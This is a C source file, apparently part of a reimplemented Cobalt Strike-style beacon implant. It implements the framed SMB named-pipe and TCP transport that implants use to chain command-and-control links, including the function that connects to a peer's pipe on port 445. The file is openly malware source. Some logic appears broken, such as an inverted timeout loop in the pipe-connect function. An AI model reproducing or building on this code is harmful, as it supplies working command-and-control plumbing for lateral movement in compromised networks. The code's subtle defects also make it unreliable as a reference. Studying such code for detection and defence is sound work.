#include "pch.h"

#include "protocol.h"

#include "link.h"
#include "beacon.h"
#include "pipe.h"
#include "settings.h"

int ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
{
	int read, totalRead;
	for(totalRead = 0; totalRead < length; totalRead += read)
	{
		if (!ReadFile(channel, buffer + totalRead, length - totalRead, &read, NULL))
			return -1;

		if (read == 0)
			return -1;
	}

	if (totalRead != length)
		return -1;

	return totalRead;
}

int ProtocolTcpSocketRead(SOCKET channel, char* buffer, int length)
{
	int read, totalRead;
	for (totalRead = 0; totalRead < length; totalRead += read)
	{
		read = recv(channel, buffer + totalRead, length - totalRead, 0);
		if (read == SOCKET_ERROR)
			return -1;

		if (read == 0)
			break;
	}

	if (totalRead != length)
		return -1;

	return totalRead;
}

BOOL ProtocolSmbPipeWrite(HANDLE hFile, char* buffer, int length)
{
    DWORD wrote;

    // Check if size is greater than 0
    for (DWORD totalWrote = 0; totalWrote < length; totalWrote += wrote) {
        // Calculate the number of bytes to be written in the current iteration
        const DWORD toWrite = min(length - totalWrote, 0x2000);


        // Check if the write operation was successful
        if (!WriteFile(hFile, buffer + totalWrote, toWrite, &wrote, NULL)) {
            return FALSE;
        }
    }

    return TRUE;
}

BOOL ProtocolTcpSocketWrite(SOCKET channel, char* buffer, int length)
{
	if(length == 0)
		return TRUE;

	return send(channel, buffer, length, 0) != SOCKET_ERROR;
}

char* ProtocolHeaderGet(char* setting, int headerSize, int* pHeaderLength)
{
	datap parser;
	BeaconDataParse(&parser, setting, headerSize);
	SHORT headerLength = BeaconDataShort(&parser);
	*pHeaderLength = headerLength;
	char* header = BeaconDataPtr(&parser, headerLength);
	*(int*)(header + *pHeaderLength - sizeof(int)) = headerSize;
	return header;
}

int ProtocolSmbRead(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, 0, &headerSize);
	int totalHeaderRead = ProtocolSmbPipeRead(protocol->channel.handle, header, headerSize);
	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
		return -1;

	int dataSize = *(int*)(header + headerSize - sizeof(int));
	if ( dataSize < 0 || dataSize > length)
		return -1;

	return ProtocolSmbPipeRead(protocol->channel.handle, buffer, dataSize);
}

int ProtocolTcpRead(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, 0, &headerSize);
	int totalHeaderRead = ProtocolTcpSocketRead(protocol->channel.socket, header, headerSize);
	if (totalHeaderRead == -1 || totalHeaderRead != headerSize)
		return -1;

	int dataSize = *(int*)(header + headerSize - sizeof(int));
	if (dataSize < 0 || dataSize > length)
		return -1;

	return ProtocolTcpSocketRead(protocol->channel.socket, buffer, dataSize);
}

BOOL ProtocolTcpWrite(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_TCP_FRAME_HEADER, length, &headerSize);
	if (!ProtocolTcpSocketWrite(protocol->channel.socket, header, headerSize))
		return FALSE;

	return ProtocolTcpSocketWrite(protocol->channel.socket, buffer, length);
}

BOOL ProtocolSmbWrite(PROTOCOL* protocol, char* buffer, int length)
{
	int headerSize;
	char* header = ProtocolHeaderGet(S_SMB_FRAME_HEADER, length, &headerSize);
	if (!ProtocolSmbPipeWrite(protocol->channel.handle, header, headerSize))
		return FALSE;

	return ProtocolSmbPipeWrite(protocol->channel.handle, buffer, length);
}

void ProtocolTcpClose(PROTOCOL* protocol)
{
	shutdown(protocol->channel.socket, SD_BOTH);
	closesocket(protocol->channel.socket);
}

void ProtocolSmbClose(PROTOCOL* protocol)
{
	DisconnectNamedPipe(protocol->channel.handle);
	CloseHandle(protocol->channel.handle);
}

void ProtocolSmbFlush(PROTOCOL* protocol)
{
	FlushFileBuffers(protocol->channel.handle);
}

BOOL ProtocolSmbWaitForData(PROTOCOL* protocol, DWORD waitTime, int iterWaitTime)
{
	return PipeWaitForData(protocol->channel.handle, waitTime, iterWaitTime);
}

BOOL ProtocolTcpWaitForData(PROTOCOL* protocol, DWORD waitTime, int iterWaitTime)
{
	int timeout = GetTickCount() + waitTime;
	int argp = 1;
	
	if (ioctlsocket(protocol->channel.socket, FIONREAD, &argp) == SOCKET_ERROR)
		return FALSE;

	BOOL result = FALSE;
	while (GetTickCount() < timeout)
	{
		char buf[1];
		int received = recv(protocol->channel.socket, buf, sizeof(char), MSG_PEEK);
		if(!received)
			break;

		if(received > 0)
		{
			result = TRUE;
			break;
		}

		if (WSAGetLastError() != WSAEWOULDBLOCK)
			break;

		Sleep(iterWaitTime);
	}

	argp = 0;
	if (ioctlsocket(protocol->channel.socket, FIONREAD, &argp) == SOCKET_ERROR)
		return FALSE;

	return result;
}

PROTOCOL* ProtocolSmbInit(PROTOCOL* protocol, HANDLE handle)
{
	protocol->channel.handle = handle;
	protocol->read = ProtocolSmbRead;
	protocol->write = ProtocolSmbWrite;
	protocol->close = ProtocolSmbClose;
	protocol->flush = ProtocolSmbFlush;
	protocol->waitForData = ProtocolSmbWaitForData;
	return protocol;
}

PROTOCOL* ProtocolTcpInit(PROTOCOL* protocol, SOCKET socket)
{
	protocol->channel.socket = socket;
	protocol->read = ProtocolTcpRead;
	protocol->write = ProtocolTcpWrite;
	protocol->close = ProtocolTcpClose;
	protocol->flush = NULL;
	protocol->waitForData = ProtocolTcpWaitForData;
	return protocol;
}

void ProtocolSmbOpenExplicit(char* data)
{
	int timeout = GetTickCount() + 15000;
	HANDLE file;
	while (timeout < GetTickCount())
	{
		file = CreateFileA(data, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
		if (file != INVALID_HANDLE_VALUE)
		{
			int mode = PIPE_READMODE_MESSAGE;
			if (!SetNamedPipeHandleState(file, &mode, NULL, NULL))
			{
				DWORD lastError = GetLastError();
				LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
				BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
				goto cleanup;
			}

			PROTOCOL protocol;
			ProtocolSmbInit(&protocol, file);
			int port = 445;
			if (!LinkAdd(&protocol, port))
				goto cleanup;

			return;
		}

		if (GetLastError() == ERROR_PIPE_BUSY)
		{
			WaitNamedPipeA(data, 10000);
		}
		else
		{
			Sleep(1000);
		}
	}

	DWORD lastError = GetLastError();
	if (lastError == ERROR_SEM_TIMEOUT)
	{
		LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
		BeaconErrorNA(ERROR_CONNECT_TO_PIPE_TIMEOUT);
	}
	else
	{
		LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
	}

	cleanup:
		DisconnectNamedPipe(file);
		CloseHandle(file);
}
